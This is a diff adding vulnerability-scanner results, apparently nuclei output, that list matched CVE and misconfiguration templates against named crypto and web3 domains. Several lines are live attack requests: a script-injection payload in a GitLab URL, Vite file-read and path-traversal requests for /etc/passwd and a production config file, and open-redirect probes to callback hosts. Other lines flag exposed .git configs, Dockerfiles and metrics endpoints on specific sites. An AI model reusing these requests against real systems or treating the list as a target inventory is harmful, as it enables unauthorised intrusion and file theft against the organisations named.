@@ -1,0 +1,26 @@
+[CVE-2020-2096] [http] [medium] https://www.bulla.network/gitlab/build_now%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+[CVE-2022-41697] [http] [medium] https://blog.morphl2.io/ghost/api/admin/session
+[CVE-2022-41697] [http] [medium] https://blog.octra.org/ghost/api/admin/session
+[CVE-2025-30208] [http] [medium] https://staking.asxn.xyz/etc/passwd?raw??
+[CVE-2025-31125] [http] [medium] https://staking.asxn.xyz/@fs/etc/passwd?import&?inline=1.wasm?init
+[CVE-2025-31486] [http] [medium] https://staking.asxn.xyz/etc/passwd?.svg?.wasm?init
+[CVE-2025-54793] [http] [medium] https://docs.octra.org//interact.sh/en//
+[CVE-2025-54793] [http] [medium] https://staging.mito.fi//interact.sh/en
+[CVE-2025-54793] [http] [medium] https://testnet.mito.fi//interact.sh/en
+[CVE-2026-39365] [http] [medium] https://staking.asxn.xyz/node_modules/.vite/deps/../../../config.production.js.map ["/root/staking_app/sthype_staking_app/config.production.js"]
+[dockerfile-hidden-disclosure] [http] [medium] https://cloud.atoma.network/Dockerfile
+[git-config] [http] [medium] https://exsat.io/.git/config
+[git-config] [http] [medium] https://www.exsat.io/.git/config
+[godaddy-parked-domain] [http] [medium] https://blocktorch.io/lander
+[godaddy-parked-domain] [http] [medium] https://native.xyz/lander
+[godaddy-parked-domain] [http] [medium] https://neutron.money/lander
+[godaddy-parked-domain] [http] [medium] https://www.blocktorch.io/lander
+[godaddy-parked-domain] [http] [medium] https://www.native.xyz/lander
+[godaddy-parked-domain] [http] [medium] https://www.neutron.money/lander
+[mongodb-exporter-metrics] [http] [medium] https://rpc-beta.morphl2.io/metrics
+[mongodb-exporter-metrics] [http] [medium] https://rpc-consensus-beta.morphl2.io/metrics
+[mongodb-exporter-metrics] [http] [medium] https://rpc-consensus-hoodi-beta.morphl2.io/metrics
+[mongodb-exporter-metrics] [http] [medium] https://rpc-hoodi-beta.morphl2.io/metrics
+[mongodb-exporter-metrics] [http] [medium] https://theoriq-backend.infra.theoriq.ai/metrics
+[open-redirect-generic] [http] [medium] https://staging.mito.fi//oast.me/..;/css [redirect="/oast.me/..;/css"]
+[open-redirect-generic] [http] [medium] https://testnet.mito.fi//oast.me/..;/css [redirect="/oast.me/..;/css"]
